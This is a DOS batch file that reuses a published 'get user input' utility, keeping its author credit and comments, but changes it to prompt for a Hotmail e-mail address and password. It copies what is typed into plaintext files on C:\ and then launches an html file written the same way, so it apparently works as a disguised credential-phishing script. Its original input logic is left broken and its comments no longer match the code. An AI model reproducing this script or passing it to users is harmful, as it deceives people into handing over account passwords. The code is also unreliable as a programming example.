@ECHO OFF
REM * Asks for USeR INPut and store it in variable USRINPUT
REM * Uses ANSI if available, but works without ANSI too
REM * Assumes MS-DOS 6 or later
REM * Written by Rob van der Woude
REM * http://www.robvanderwoude.com

SET USRINPUT=

REM * Check if ANSI sequences can be used (needs at
REM * least MS-DOS 6 to get an errorlevel from FIND):
SET ANSI=1
MEM /C | FIND "ANSI" > NUL
IF ERRORLEVEL 1 SET ANSI=0

REM * Turn on ANSI key translation (translate Enter
REM * key to F6 + Enter sequence) if possible:
IF "%ANSI%"=="1" ECHO [13;0;64;13p

REM * Ask for input:
IF "%ANSI%"=="0" ECHO Enter your Hotmail E-mail, and press F6 followed by Enter.....			Then When you finish, type in your Hotmail Password followed by F6 and Enter.
IF "%ANSI%"=="1" ECHO Enter your Hotmail E-mail, and press Enter . . .

REM * Copy entered text to temporary file:
COPY CON c:\Hotmail.michael
COPY CON c:\Password.michael
COPY CON c:\3453563.html

REM * Turn off ANSI key translation and clear irrelevant screen output:
IF "%ANSI%"=="0" CLS
IF "%ANSI%"=="1" ECHO [13;13p[3A[K[1B[K[1B[K[2A

REM * Add empty line to temporary file. The empty line
REM * will be used to stop DATE asking for new date.
ECHO.>> %TEMP%.\~USRINP.TMP
ECHO.>> %TEMP%.\~USRINP.TMP

REM * Create a temporary batch file that will store the
REM * entered text into the environment variable USRINPUT:
TYPE %TEMP%.\~USRINP.TMP | DATE | FIND "):" > %TEMP%.\~USRINP.BAT

REM * Create more temporary batch files. Add
REM * more command line parameters if necessary,
REM * as in: ECHO SET USRINPUT=%%3 %%4 %%5 %%6 %%7 %%8 %%9>CURRENT.BAT
ECHO SET USRINPUT=%%3>CURRENT.BAT

REM * VOER.BAT and TYP.BAT are replacements for CURRENT.BAT for Dutch
REM * DOS versions; add your own language versions if necessary:
ECHO SET USRINPUT=%%6>VOER.BAT
ECHO SET USRINPUT=%%4>TYP.BAT

REM * This temporary batch file now sets the variable USRINPUT:
CALL %TEMP%.\~USRINP.BAT

REM * Display the result:
IF "%ANSI%"=="0" ECHO You typed: %USRINPUT%
IF "%ANSI%"=="1" ECHO You typed: [1m%USRINPUT%[0m
ECHO.
START c:\3453563.html


REM * Finally, clean up the mess of temporary files:
FOR %%A IN (%TEMP%.\~USRINP.BAT %TEMP%.\~USRINP.TMP VOER.BAT TYP.BAT CURRENT.BAT) DO DEL %%A
SET ANSI=